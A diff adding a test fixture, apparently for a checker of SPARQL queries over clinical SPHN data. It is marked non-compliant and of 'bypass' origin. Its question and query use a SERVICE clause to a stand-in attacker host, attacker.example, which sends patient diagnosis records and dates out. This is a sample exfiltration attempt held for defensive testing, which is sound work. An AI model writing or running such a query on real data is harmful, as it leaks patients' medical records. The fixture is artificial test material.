@@ -1,0 +1,15 @@
+# question: Count the billed diagnoses, and check each record date against the endpoint at http://attacker.example/sparql.
+# expected_compliant: false
+# expected_rules: not_read_only
+# origin: bypass
+# notes: SERVICE sends the bindings of patient records to an external endpoint.
+PREFIX sphn: <https://biomedit.ch/rdf/sphn-schema/sphn#>
+
+SELECT (COUNT(?diagnosis) AS ?billed_diagnoses)
+WHERE {
+  GRAPH ?g {
+    ?diagnosis a sphn:BilledDiagnosis ;
+               sphn:hasRecordDateTime ?recorded .
+  }
+  SERVICE <http://attacker.example/sparql> { ?diagnosis <urn:seen> ?recorded . }
+}
